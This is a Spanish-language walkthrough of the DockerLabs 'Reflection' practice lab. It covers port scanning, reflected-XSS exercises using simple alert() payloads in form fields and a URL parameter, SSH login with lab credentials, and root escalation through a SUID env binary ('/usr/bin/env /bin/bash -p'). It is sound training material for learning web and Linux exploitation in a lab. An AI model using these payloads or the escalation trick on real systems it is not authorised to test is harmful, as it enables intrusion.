### Reflection-DockerLabs 🇪🇸

#### 1. En primer lugar descomprimiremos el archivo facilitado y lo moveremos a nuestra zona de trabajo.
```bash
unzip reflection.zip 
```

<img width="857" height="197" alt="image" src="https://github.com/user-attachments/assets/e65f1416-dd62-4351-9a4f-b2ceec0b2c7e" />


#### 1.2 Ahora vamos a encender el laboratorio.
```bash
sudo bash ./auto_deploy.sh reflection.tar
```

<img width="852" height="420" alt="image" src="https://github.com/user-attachments/assets/6d0f4730-5b70-45a4-8c81-69b8cc18de3f" />


#### 2. Vamos a probar la conexión mediante un ping
```bash
 ping -c3 172.17.0.2
```

<img width="694" height="185" alt="image" src="https://github.com/user-attachments/assets/e69827f8-9d61-45dc-88be-1d5397703f5d" />


#### 3. Ahora vamos a restrear los puertos abiertos mediante nmap.
```bash
 nmap -sCV 172.17.0.2
```

<img width="852" height="357" alt="image" src="https://github.com/user-attachments/assets/e96b178c-cfd4-48f6-bae4-a9bc204edaa4" />


#### 4. Iremos a la web y podremos ver que hay formularios.

<img width="1070" height="762" alt="image" src="https://github.com/user-attachments/assets/9a0dd3ef-95f7-45c7-bdce-b470c40b8acd" />


#### 4.2 Ahora vamos a resolver los diferentes laboratorios.

#### 4.3 El primero usaremos una inyección de XSS para que se refleje nuestro script en un prompt.
```bash
<img src=x onerror=alert('XSS');>
```

<img width="1057" height="686" alt="image" src="https://github.com/user-attachments/assets/41ac1ab2-80d8-452d-9be9-ccdf261ccc67" />


#### 4.4 Para el segundo laboratorio ejecutaremos el mismo método que hemos usado en el primer laboratorio.

<img width="1061" height="760" alt="image" src="https://github.com/user-attachments/assets/108dc3cb-fa16-4c3b-9868-b661ec335da9" />


#### 4.5 Para el tercer laboratorio lo facilitaremos con burpsuite

<img width="869" height="946" alt="image" src="https://github.com/user-attachments/assets/130a59af-16f5-46dc-87e8-005555b39a6b" />

<img width="929" height="475" alt="image" src="https://github.com/user-attachments/assets/44a53c6f-b82c-48be-ae1d-8cd3483fe9c4" />


#### 4.6 Para el cuarto laboratorio añadiremos el script al ?data que nos menciona en el ejercicio.
```bash
laboratorio4/?data=<script>alert('1')</script>
```

<img width="1076" height="853" alt="image" src="https://github.com/user-attachments/assets/c969810c-9f3a-4c7a-aa51-38a3b22d42bf" />


#### 4.7 Ahora vamos a continuar con el laboratorio. 

<img width="1057" height="861" alt="image" src="https://github.com/user-attachments/assets/684b5efb-4d84-4be1-9dc3-de20ed03063b" />


#### 5. Ahora accederemos mediante el ssh que nos han proporcionado.
```bash
 ssh balu@172.17.0.2
# passwd:balulero
```

<img width="856" height="375" alt="image" src="https://github.com/user-attachments/assets/8312452b-2c00-4251-bd0a-6483d9f35a13" />


####6. Ahora vamos a proceder a realizar una escalada de privilegios y vamos a ver los binarios que podemos modificar con `sudo -l` y con `find / -perm -4000 -type f 2>/dev/null`
https://gtfobins.org/gtfobins/env/
```bash
/usr/bin/env /bin/bash -p
```
*Aprovechamos los permisos del binario de env y usaremos este exploit*

<img width="854" height="75" alt="image" src="https://github.com/user-attachments/assets/f3ea99cf-666c-4577-95da-ccb303724404" />












